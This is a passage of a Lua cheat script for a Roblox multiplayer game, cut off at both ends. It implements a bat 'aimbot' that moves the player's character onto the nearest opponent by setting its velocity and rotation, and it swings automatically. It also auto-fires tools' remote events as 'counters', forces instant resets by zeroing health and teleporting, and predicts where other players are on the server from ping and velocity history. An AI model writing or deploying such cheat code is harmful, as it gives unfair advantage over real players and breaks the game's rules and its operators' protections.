        elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency=1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled=false end
    end)
end
enableAntiLag=function()
    removeAccessoriesEnabled=true;antiLagEnabled=true
    defLightBrightness=defLightBrightness or Lighting.Brightness;defLightClock=defLightClock or Lighting.ClockTime;defLightAmbient=defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows=false;Lighting.FogEnd=1e10;Lighting.Brightness=1;Lighting.EnvironmentDiffuseScale=0;Lighting.EnvironmentSpecularScale=0
    for _,e in pairs(Lighting:GetChildren()) do pcall(function() if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled=false end end) end
    for _,obj in ipairs(workspace:GetDescendants()) do applyAntiLagDerender(obj) end
    if antiLagDescConn then antiLagDescConn:Disconnect() end
    antiLagDescConn=workspace.DescendantAdded:Connect(function(obj) if removeAccessoriesEnabled then applyAntiLagDerender(obj) end end)
end
disableAntiLag=function()
    removeAccessoriesEnabled=false;antiLagEnabled=false;if antiLagDescConn then antiLagDescConn:Disconnect();antiLagDescConn=nil end
    pcall(function() if defLightBrightness then Lighting.Brightness=defLightBrightness end;if defLightClock then Lighting.ClockTime=defLightClock end;if defLightAmbient then Lighting.OutdoorAmbient=defLightAmbient end;Lighting.ExposureCompensation=0 end)
end
function findMedusa()
    local c=LP.Character;if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=LP:FindFirstChild("Backpack");if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end
function useMedusaCounter()
    if medusaDebounce then return end
    if MEDUSA_COOLDOWN > (tick() - medusaLastUsed) then return end
    local c = LP.Character
    if not c then return end
    medusaDebounce = true
    local med = findMedusa()
    if not med then
        medusaDebounce = false
        return
    end
    if med.Parent ~= c then
        local hum2 = c:FindFirstChildOfClass("Humanoid")
        if hum2 then pcall(function() hum2:EquipTool(med) end) end
    end
    pcall(function() med:Activate() end)
    pcall(function()
        local remote = med:FindFirstChildOfClass("RemoteEvent") or med:FindFirstChildOfClass("RemoteFunction")
        if remote and remote:IsA("RemoteEvent") then
            remote:FireServer()
            remote:FireServer()
        end
    end)
    task.defer(function()
        pcall(function() if med and med.Parent then med:Activate() end end)
    end)
    medusaLastUsed = tick()
    medusaDebounce = false
end
function doInstantReset()
    if _oceanResetBusy then return end
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    _oceanResetBusy = true

    local cam = workspace.CurrentCamera
    local lockedCamCFrame = cam and cam.CFrame or CFrame.new()

    pcall(function()
        if cam then
            cam.CameraType = Enum.CameraType.Scriptable
            cam.CFrame = lockedCamCFrame
        end
    end)

    pcall(function()
        RunService:BindToRenderStep("OceanCamLock", Enum.RenderPriority.Camera.Value + 1, function()
            local c = workspace.CurrentCamera
            if c then
                c.CameraType = Enum.CameraType.Scriptable
                c.CFrame = lockedCamCFrame
            end
            local activeChar = LP.Character
            local activeHrp = activeChar and activeChar:FindFirstChild("HumanoidRootPart")
            if activeHrp then
                activeHrp.AssemblyLinearVelocity = Vector3.zero
                activeHrp.AssemblyAngularVelocity = Vector3.zero
                activeHrp.CFrame = OCEAN_RESET_TP
            end
        end)
    end)

    -- force death so CharacterAdded fires
    pcall(function()
        if hum.Health > 0 then hum.Health = 0 end
    end)

    local conn
    conn = LP.CharacterAdded:Connect(function(newChar)
        if conn then conn:Disconnect() end
        pcall(function() RunService:UnbindFromRenderStep("OceanCamLock") end)
        local newHum = newChar:WaitForChild("Humanoid", 5)
        task.wait(0.05)
        pcall(function()
            local c = workspace.CurrentCamera
            if c and newHum then
                c.CameraSubject = newHum
                c.CameraType = Enum.CameraType.Custom
            end
        end)
        _oceanResetBusy = false
    end)

    task.delay(6, function()
        if _oceanResetBusy then
            pcall(function() RunService:UnbindFromRenderStep("OceanCamLock") end)
            pcall(function()
                local c = workspace.CurrentCamera
                if c then c.CameraType = Enum.CameraType.Custom end
            end)
            _oceanResetBusy = false
        end
    end)
end

function triggerInstantReset()
    doInstantReset()
end

function triggerMedusaReset(reason)
    if not autoResetOnMedusaEnabled then return end
    if _oceanResetBusy then return end
    task.delay(2, function()
        if not autoResetOnMedusaEnabled then return end
        if _oceanResetBusy then return end
        doInstantReset()
    end)
end

function setupAutoResetOnDie(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
    if not hum then return end
    hum.Died:Connect(function()
        if not autoResetOnDieEnabled then return end
        if _oceanResetBusy then return end
        task.defer(function()
            if autoResetOnDieEnabled and not _oceanResetBusy then
                doInstantReset()
            end
        end)
    end)
end

pcall(function()
    LP.CharacterAdded:Connect(function(char)
        task.defer(function()
            if setupAutoResetOnDie then setupAutoResetOnDie(char) end
            if (autoResetOnMedusaEnabled or medusaCounterEnabled) and setupMedusa then
            end
        end)
    end)
    if LP.Character then
        task.defer(function()
            if setupAutoResetOnDie then setupAutoResetOnDie(LP.Character) end
        end)
    end
end)

function onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if not part.Anchored then return end
        if (part.Transparency >= 0.9 or part.Name:lower():find("stone") or part.Name:lower():find("medusa")) then
            if autoResetOnMedusaEnabled then
                pcall(triggerMedusaReset, "stone")
            elseif medusaCounterEnabled then
                pcall(useMedusaCounter)
            end
        elseif part.Transparency == 1 then
            if autoResetOnMedusaEnabled then
                pcall(triggerMedusaReset, "stone")
            elseif medusaCounterEnabled then
                pcall(useMedusaCounter)
            end
        end
    end)
end
setupMedusa=function(char)
    for _,c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end;Conns.anchor={}
    if not char then return end
    if not medusaCounterEnabled and not autoResetOnMedusaEnabled then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end
    table.insert(Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end))
end

task.defer(function()
    local char = LP.Character
    if not char then return end
    if medusaCounterEnabled then
        pcall(function() setupMedusa(char) end)
        pcall(function() setupRagdollTriggers() end)
    end
end)

stopMedusaCounter=function()
    for _,c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
    Conns.anchor={}
end
BAT_COUNTER_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Snowy Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
function findBatForCounter()
    local c=LP.Character;if not c then return nil end;local bp=LP:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end
function swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end);task.wait(0.15);pcall(function() bat:Activate() end) end
end
startBatCounter=function()
    if Conns.batCounter then return end
    Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not batCounterEnabled or batCounterDebounce then return end
        local char=LP.Character;if not char then return end;local hum2=char:FindFirstChildOfClass("Humanoid");if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            batCounterDebounce=true;task.spawn(function() local bat=findBatForCounter();if bat then swingBatForCounter(bat,char) end;task.wait(0.5);batCounterDebounce=false end)
        end
    end)
end
stopBatCounter=function() if Conns.batCounter then Conns.batCounter:Disconnect();Conns.batCounter=nil end;batCounterDebounce=false end

_predBall=nil
function findBat()
    local char=LP.Character;if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=LP:FindFirstChild("Backpack");if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end
function isHoldingCarryTool()
    local char = LP.Character
    if not char then return false end

    local function isGear(name)
        local n = string.lower(tostring(name or "")):gsub("^%s+", ""):gsub("%s+$", "")
        if n == "" then return true end
        if n == "bat" or n == "baseball bat" or n == "slap" or n == "slap bat" then return true end
        if n:sub(1, 4) == "bat " or n:sub(-4) == " bat" then return true end
        if n:find("medusa", 1, true) then return true end
        if n:find("slap", 1, true) and #n <= 12 then return true end
        if n:find("coil", 1, true) then return true end
        if n:find("trowel", 1, true) or n:find("bomb", 1, true) then return true end
        if n:find("rocket", 1, true) or n:find("grenade", 1, true) then return true end
        if n == "sword" or n == "knife" or n == "gun" then return true end
        return false
    end

    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Tool") and not isGear(obj.Name) then
            return true
        end
    end
    return false
end

_brainrotCarryActive = false
local function _refreshBrainrotCarryFlag(char)
    char = char or (LP and LP.Character)
    _brainrotCarryActive = false
    if not char then return end
    pcall(function()
        _brainrotCarryActive = isHoldingCarryTool() and true or false
    end)
end
local function _hookCharCarry(char)
    if not char then return end
    _refreshBrainrotCarryFlag(char)
    char.ChildAdded:Connect(function(child)
        if child:IsA("Tool") then
            task.defer(function() _refreshBrainrotCarryFlag(char) end)
        end
    end)
    char.ChildRemoved:Connect(function(child)
        if child:IsA("Tool") then
            task.defer(function() _refreshBrainrotCarryFlag(char) end)
        end
    end)
end
pcall(function()
    if LP.Character then _hookCharCarry(LP.Character) end
    LP.CharacterAdded:Connect(function(char)
        _brainrotCarryActive = false
        task.defer(function() _hookCharCarry(char) end)
    end)
end)

function getClosestTarget()
    local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart");if not root then return nil end
    local closest,minDist=nil,math.huge
    for _,plr in ipairs(Players:GetPlayers()) do
        if plr~=LP and plr.Character then
            local tRoot=plr.Character:FindFirstChild("HumanoidRootPart");local hum=plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health>0 then local dist=(tRoot.Position-root.Position).Magnitude;if dist<minDist then minDist=dist;closest=tRoot end end
        end
    end
    return closest
end
function swingCurrentBat()
    if not autoSwingEnabled then return end;local bat=findBat()
    if bat and bat.Parent==LP.Character and bat:IsA("Tool") then pcall(function() bat:Activate() end) end
end
startBatAimbot=function()
    if isHoldingCarryTool and isHoldingCarryTool() then
        autoBatEnabled = false
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        return
    end
    if aimbotConn then aimbotConn:Disconnect() end;autoBatEnabled=true
    if autoLeftEnabled then autoLeftEnabled=false;if autoLeftSetVisual then autoLeftSetVisual(false) end;stopAutoLeft() end
    if autoRightEnabled then autoRightEnabled=false;if autoRightSetVisual then autoRightSetVisual(false) end;stopAutoRight() end
    local char0=LP.Character
    local hum0=char0 and char0:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate=false end
    pcall(function()
        if not char0 or not hum0 then return end
        local held = char0:FindFirstChildOfClass("Tool")
        if not held then
            local bat = findBat and findBat() or nil
            if bat and hum0 then pcall(function() hum0:EquipTool(bat) end) end
        end
    end)
    aimbotConn=RunService.RenderStepped:Connect(function()
        if not autoBatEnabled then return end
        local c=LP.Character;if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart");if not root then return end
        local hum=c:FindFirstChildOfClass("Humanoid");if not hum then return end
        if isHoldingCarryTool and isHoldingCarryTool() then
            stopBatAimbot()
            return
        end
        local held = c:FindFirstChildOfClass("Tool")
        if not held then
            local bat=findBat()
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end
        local target=getClosestTarget()
        if not target then swingCurrentBat();return end
        local targetVel=target.AssemblyLinearVelocity
        local myPos=root.Position
        local targetPos=target.Position
        local predictPos=targetPos+targetVel*0.14
        predictPos=predictPos+target.CFrame.LookVector*0.3
        local direction=predictPos-myPos
        local flatDir=Vector3.new(direction.X,0,direction.Z).Unit
        local chaseSpeed=aimbotSpeed or 58
        local desiredHeight=targetPos.Y+3.7
        local yVel=(desiredHeight-myPos.Y)*19.5+targetVel.Y*0.8
        if hum.FloorMaterial~=Enum.Material.Air then
            yVel=math.max(yVel,13)
        end
        yVel=math.clamp(yVel,-70,110)
        local desiredVel=Vector3.new(flatDir.X*chaseSpeed,yVel,flatDir.Z*chaseSpeed)
        root.AssemblyLinearVelocity=root.AssemblyLinearVelocity:Lerp(desiredVel,0.8)
        local speed3=targetVel.Magnitude
        local predictTime=math.clamp(speed3/150,0.05,0.2)
        local predictedPos=targetPos+targetVel*predictTime
        local toPredict=predictedPos-myPos
        if toPredict.Magnitude>0.1 then
            local goalCF=CFrame.lookAt(myPos,predictedPos)
            local curCF=root.CFrame
            local diffCF=curCF:Inverse()*goalCF
            local rx,ry,rz=diffCF:ToEulerAnglesXYZ()
            rx=math.clamp(rx,-2.5,2.5)
            ry=math.clamp(ry,-2.5,2.5)
            rz=math.clamp(rz,-2.5,2.5)
            local tiltSpeed=42
            root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(
                Vector3.new(rx*tiltSpeed,ry*tiltSpeed,rz*tiltSpeed)
            )
        end
        swingCurrentBat()
    end)
    if autoBatSetVisual then autoBatSetVisual(true) end
    if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
end
stopBatAimbot=function()
    if aimbotConn then aimbotConn:Disconnect();aimbotConn=nil end
    if aimbotV2Conn then pcall(function() aimbotV2Conn:Disconnect() end); aimbotV2Conn=nil end
    autoBatEnabled=false
    _aimbotV2Target=nil
    if _predBall then _predBall:Destroy();_predBall=nil end
    local char=LP.Character;local root=char and char:FindFirstChild("HumanoidRootPart")
    if root then root.AssemblyLinearVelocity=Vector3.zero;root.AssemblyAngularVelocity=Vector3.zero end
    local hum2=char and char:FindFirstChildOfClass("Humanoid");if hum2 then hum2.AutoRotate=true end
    if autoTPEnabled then startAutoTP() end
    if autoBatSetVisual then autoBatSetVisual(false) end
    if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
end

_aimbotV2Target = nil
_aimbotV2LastScan = 0
aimbotV2Conn = nil

startBatAimbotV2Ball = function()
    if isHoldingCarryTool and isHoldingCarryTool() then
        autoBatEnabled = false
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        return
    end
    if aimbotV2Conn then pcall(function() aimbotV2Conn:Disconnect() end); aimbotV2Conn = nil end
    if aimbotConn then pcall(function() aimbotConn:Disconnect() end); aimbotConn = nil end
    if autoLeftEnabled then autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
    if autoRightEnabled then autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end

    autoBatEnabled = true
    _aimbotV2Target = nil
    _aimbotV2LastScan = 0

    local char0 = LP.Character
    local hum0 = char0 and char0:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end
    pcall(function()
        if not char0 or not hum0 then return end
        if not char0:FindFirstChildOfClass("Tool") then
            local bat = findBat and findBat() or nil
            if bat then pcall(function() hum0:EquipTool(bat) end) end
        end
    end)

    aimbotV2Conn = RunService.Heartbeat:Connect(function()
        if not autoBatEnabled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        if isHoldingCarryTool and isHoldingCarryTool() then
            stopBatAimbot()
            return
        end
        if not char:FindFirstChildOfClass("Tool") then
            local bat = findBat and findBat() or nil
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end

        local now = tick()
        local target = _aimbotV2Target
        if now - (_aimbotV2LastScan or 0) > 0.1 or not target or not target.Parent then
            _aimbotV2LastScan = now
            target = nil
            local closest, minDist = nil, math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character then
                    local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
                    local th = plr.Character:FindFirstChildOfClass("Humanoid")
                    if tRoot and th and th.Health > 0 then
                        local dist = (tRoot.Position - root.Position).Magnitude
                        if dist < minDist then
                            minDist = dist
                            closest = tRoot
                        end
                    end
                end
            end
            target = closest
            _aimbotV2Target = target
        else
            local th = target.Parent and target.Parent:FindFirstChildOfClass("Humanoid")
            if not th or th.Health <= 0 then
                _aimbotV2Target = nil
                target = nil
            end
        end

        if not target then
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
            if swingCurrentBat then swingCurrentBat() end
            return
        end

        hum.AutoRotate = false
        local targetVel = target.AssemblyLinearVelocity
        local myPos = root.Position
        local targetPos = target.Position
        local predictPos = targetPos + targetVel * 0.14
        predictPos = predictPos + target.CFrame.LookVector * 0.3
        local direction = predictPos - myPos
        local flatDir = Vector3.new(direction.X, 0, direction.Z)
        if flatDir.Magnitude > 0.01 then flatDir = flatDir.Unit else flatDir = Vector3.new(0,0,1) end

        local chaseSpeed = aimbotSpeed or 58
        local desiredHeight = targetPos.Y + 3.7
        local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
        if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
        yVel = math.clamp(yVel, -70, 110)

        local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)

        local speed3 = targetVel.Magnitude
        local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
        local predictedPos = targetPos + targetVel * predictTime
        local toPredict = predictedPos - myPos
        if toPredict.Magnitude > 0.1 then
            local goalCF = CFrame.lookAt(myPos, predictedPos)
            local diffCF = root.CFrame:Inverse() * goalCF
            local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
            rx = math.clamp(rx, -2.5, 2.5)
            ry = math.clamp(ry, -2.5, 2.5)
            rz = math.clamp(rz, -2.5, 2.5)
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx * 42, ry * 42, rz * 42))
        end

        if autoSwingEnabled then
            local bat = char:FindFirstChild("Bat") or (findBat and findBat())
            if bat and bat:IsA("Tool") then pcall(function() bat:Activate() end) end
        end
    end)

    if autoBatSetVisual then autoBatSetVisual(true) end
    if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
end

queueAutoBatStart=function()
    if isHoldingCarryTool and isHoldingCarryTool() then
        autoBatEnabled = false
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
        return
    end
    if autoLeftEnabled then autoLeftEnabled=false;if autoLeftSetVisual then autoLeftSetVisual(false) end;stopAutoLeft() end
    if autoRightEnabled then autoRightEnabled=false;if autoRightSetVisual then autoRightSetVisual(false) end;stopAutoRight() end
    -- V2 removed; always V1
    startBatAimbot()
end
resetAutoBatMotion=function()
    local char=LP.Character;local hrp=char and char:FindFirstChild("HumanoidRootPart");local hum=char and char:FindFirstChildOfClass("Humanoid")
    if hrp then hrp.AssemblyLinearVelocity=hrp.AssemblyLinearVelocity*0.3;hrp.AssemblyAngularVelocity=Vector3.zero end
    if hum then hum.AutoRotate=true end
end

V2State = {
    Enabled = false,
    TargetPlayer = nil,
    LastTargetPos = nil,
    TargetVelocity = Vector3.zero,
    SmoothedVelocity = Vector3.zero,
    VelocityHistory = {},
    AirborneTime = 0,
    LastActivationTime = 0,
    HighYVelocityTime = 0,
    PingHistory = {},
    CurrentPing = 0.1,
    AccelerationHistory = {},
    LastDirectionChangeTime = 0,
    PreviousDirection = nil,
    WasAirborne = false,
    AerialVelocityHistory = {},
    AerialSmoothVelocity = Vector3.zero,
    LastGroundedPosition = nil,
    LastYVelocity = 0,
    PeakHeight = 0,
    GroundHeight = 0,
    LastJumpTime = 0,
    IsMultiJumping = false,
    VerticalVelocityHistory = {},
    RealPingMs = 0,
}

V2Connection = nil

task.spawn(function()
    while true do
        pcall(function()
            local ok, val = pcall(function() return LP.Ping end)
            if ok and type(val) == "number" and val > 0 then
                V2State.RealPingMs = val
                return
            end
            local stats = game:GetService("Stats")
            local ok2, val2 = pcall(function() return stats.Network.ServerStatsItem["Data Ping"]:GetValue() end)
            if ok2 and type(val2) == "number" then
                V2State.RealPingMs = math.floor(val2)
            end
        end)
        task.wait(0.5)
    end
end)

function updateV2Ping()
    local pingSeconds = V2State.RealPingMs / 1000
    table.insert(V2State.PingHistory, pingSeconds)
    if #V2State.PingHistory > CONFIG_V2.PingSampleSize then
        table.remove(V2State.PingHistory, 1)
    end
    local sum = 0
    for _, p in ipairs(V2State.PingHistory) do
        sum = sum + p
    end
    V2State.CurrentPing = sum / #V2State.PingHistory
    V2State.CurrentPing = math.clamp(V2State.CurrentPing, CONFIG_V2.MinPingComp, CONFIG_V2.MaxPingComp)
end

task.spawn(function()
    while true do
        task.wait(0.5)
        pcall(updateV2Ping)
    end
end)

CONFIG_V2 = {
    FollowSpeed = 55,
    MaxSpeed = 59,
    ActivateDistance = 13,
    MinFollowDistance = 1,
    PredictionTime = 0.22,
    PredictAhead = 3,
    JumpSpeedBoost = 1.5,
    ActivationDelay = 0.2,
    ServerTickrate = 1/60,
    PingSampleSize = 10,
    MinPingComp = 0.03,
    MaxPingComp = 0.25,
    VelocityHistorySize = 8,
    AccelHistorySize = 4,
    AerialHistorySize = 6,
    VerticalHistorySize = 5,
    VelocitySmoothing = 0.2,
    AerialSmoothing = 0.15,
    MaxVelocityChange = 150,
    MaxHorizontalVel = 80,
    AccelerationWeight = 0.3,
    Gravity = 196.2,
    AirControlFactor = 0.8,
    AerialVelocityDecay = 0.95,
    AerialDirectionWeight = 0.6,
    MinAirborneTime = 0.08,
}

function getNearestPlayerV2()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local myPos = root.Position
    local nearestDist = math.huge
    local nearestPlayer = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local otherRoot = p.Character:FindFirstChild("HumanoidRootPart")
            if otherRoot then
                local dist = (myPos - otherRoot.Position).Magnitude
                if dist < nearestDist then
                    nearestDist = dist
                    nearestPlayer = p
                end
            end
        end
    end
    return nearestPlayer
end

function getAverageVelocityV2()
    if #V2State.VelocityHistory == 0 then return Vector3.zero end
    local sum = Vector3.zero
    for _, vel in ipairs(V2State.VelocityHistory) do sum = sum + vel end
    return sum / #V2State.VelocityHistory
end

function getAverageAccelerationV2()
    if #V2State.AccelerationHistory == 0 then return Vector3.zero end
    local sum = Vector3.zero
    for _, a in ipairs(V2State.AccelerationHistory) do sum = sum + a end
    return sum / #V2State.AccelerationHistory
end

function getAverageAerialVelocityV2()
    if #V2State.AerialVelocityHistory == 0 then return Vector3.zero end
    local sum = Vector3.zero
    for _, vel in ipairs(V2State.AerialVelocityHistory) do
        sum = sum + Vector3.new(vel.X, 0, vel.Z)
    end
    return sum / #V2State.AerialVelocityHistory
end

function getAverageVerticalVelocityV2()
    if #V2State.VerticalVelocityHistory == 0 then return 0 end
    local sum = 0
    for _, y in ipairs(V2State.VerticalVelocityHistory) do sum = sum + y end
    return sum / #V2State.VerticalVelocityHistory
end

function detectMultiJumpV2(currentYVel, wasRising)
    local t = tick()
    if V2State.LastYVelocity < -5 and currentYVel > 10 then
        if t - V2State.LastJumpTime < 0.2 then return true end
        V2State.LastJumpTime = t
        return true
    end
    return false
end

function isFallingFromHeightV2(currentPos, yVel)
    return (currentPos.Y - V2State.GroundHeight > 20) and yVel < -15
end

function isAerialStrafingV2()
    if #V2State.AerialVelocityHistory < 3 then return false end
    local dc = 0
    for i = 2, #V2State.AerialVelocityHistory do
        local v1 = Vector3.new(V2State.AerialVelocityHistory[i-1].X, 0, V2State.AerialVelocityHistory[i-1].Z)
        local v2 = Vector3.new(V2State.AerialVelocityHistory[i].X, 0, V2State.AerialVelocityHistory[i].Z)
        if v1.Magnitude > 3 and v2.Magnitude > 3 then
            if v1.Unit:Dot(v2.Unit) < 0.7 then dc = dc + 1 end
        end
    end
    return dc >= 2
end

function detectDirectionChangeV2(currentVel)
    local horizontal = Vector3.new(currentVel.X, 0, currentVel.Z)
    if horizontal.Magnitude < 5 then return false end
    if V2State.PreviousDirection then
        local dot = V2State.PreviousDirection:Dot(horizontal.Unit)
        if dot < 0.5 then
            local t = tick()
            if t - V2State.LastDirectionChangeTime < 0.12 then
                V2State.PreviousDirection = horizontal.Unit
                V2State.LastDirectionChangeTime = t
                return true
            end
            V2State.LastDirectionChangeTime = t
        end
    end
    V2State.PreviousDirection = horizontal.Unit
    return false
end

function isErraticMovementV2()
    if #V2State.VelocityHistory < 3 then return false end
    local changes = 0
    for i = 2, #V2State.VelocityHistory do
        local v1 = Vector3.new(V2State.VelocityHistory[i-1].X, 0, V2State.VelocityHistory[i-1].Z)
        local v2 = Vector3.new(V2State.VelocityHistory[i].X, 0, V2State.VelocityHistory[i].Z)
        if v1.Magnitude > 5 and v2.Magnitude > 5 then
            if v1.Unit:Dot(v2.Unit) < 0.3 then changes = changes + 1 end
        end
    end
    return changes >= 3
end

function isInfiniteJumpingV2()
    if #V2State.VelocityHistory < 3 then return false end
    local yc = 0
    for i = 2, #V2State.VelocityHistory do
        if math.abs(V2State.VelocityHistory[i].Y - V2State.VelocityHistory[i-1].Y) > 15 then yc = yc + 1 end
    end
    return yc >= 2
end

function isJumpBoostCheatV2()
    return math.abs(V2State.TargetVelocity.Y) > 35 and V2State.HighYVelocityTime > 0.15
end

function isExtremeJumpBoostV2()
    return math.abs(V2State.TargetVelocity.Y) > 50
end

function isFloatingV2()
    return V2State.AirborneTime > 0.15 and math.abs(V2State.TargetVelocity.Y) > 3
end

function checkAirborneV2(targetRoot, targetPlayer)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.FilterDescendantsInstances = {targetPlayer.Character, LP.Character}
    local rayResult = workspace:Raycast(targetRoot.Position, Vector3.new(0, -100, 0), params)
    if rayResult then
        V2State.GroundHeight = rayResult.Position.Y
        return false
    end
    return true
end

function clampVelocityChangeV2(newVel, oldVel, maxChange)
    local delta = newVel - oldVel
    if delta.Magnitude > maxChange then
        return oldVel + (delta.Unit * maxChange)
    end
    return newVel
end

function smoothVelocityV2(current, target, alpha)
    return current:Lerp(target, alpha)
end

function predictAerialPositionV2(currentPos, velocity, dt, isStrafing, isFastFalling, isMultiJump)
    local horizVel = Vector3.new(velocity.X, 0, velocity.Z)
    local vertVel = velocity.Y
    if isStrafing then
        local avgAerial = getAverageAerialVelocityV2()
        horizVel = Vector3.new(avgAerial.X, 0, avgAerial.Z) * CONFIG_V2.AirControlFactor
    else
        horizVel = horizVel * CONFIG_V2.AirControlFactor
    end
    horizVel = horizVel * CONFIG_V2.AerialVelocityDecay
    local gravityEffect = CONFIG_V2.Gravity
    if isMultiJump then
        gravityEffect = gravityEffect * 0.3
        vertVel = vertVel * 0.9
    end
    local verticalDisplacement
    if isFastFalling then
        verticalDisplacement = (vertVel * dt) - (0.5 * gravityEffect * 1.2 * dt * dt) - (3.5 * dt)
    else
        verticalDisplacement = (vertVel * dt) - (0.5 * gravityEffect * dt * dt)
    end
    if vertVel > 8 and not isMultiJump then
        verticalDisplacement = verticalDisplacement + (2.5 * dt)
    end
    return currentPos + horizVel * dt + Vector3.new(0, verticalDisplacement, 0)
end

function predictServerPositionV2(currentPos, velocity, acceleration, ping, isQuickTurn, isAerial, isStrafing, isFastFalling, isMultiJump)
    local serverDelay = ping + CONFIG_V2.ServerTickrate
    if isQuickTurn then serverDelay = serverDelay * 1.5 end
    if isAerial then
        return predictAerialPositionV2(currentPos, velocity, serverDelay, isStrafing, isFastFalling, isMultiJump)
    end
    local predictedPos = currentPos + velocity * serverDelay
    if acceleration.Magnitude > 1 then
        predictedPos = predictedPos + (acceleration * CONFIG_V2.AccelerationWeight) * (serverDelay * serverDelay * 0.5)
    end
    return predictedPos
end

function updateRotationAngularV2(lookDirection, rootPart)
    if not rootPart then return end
    if lookDirection.Magnitude < 0.01 then return end
    local currentLook = rootPart.CFrame.LookVector
    local targetDir = lookDirection.Unit
    local axis = currentLook:Cross(targetDir)
    local angle = math.asin(math.clamp(axis.Magnitude, -1, 1))
    if axis.Magnitude > 0.01 then
        local rotSpeed = 80
        rootPart.AssemblyAngularVelocity = axis.Unit * angle * rotSpeed
    else
        rootPart.AssemblyAngularVelocity = Vector3.zero
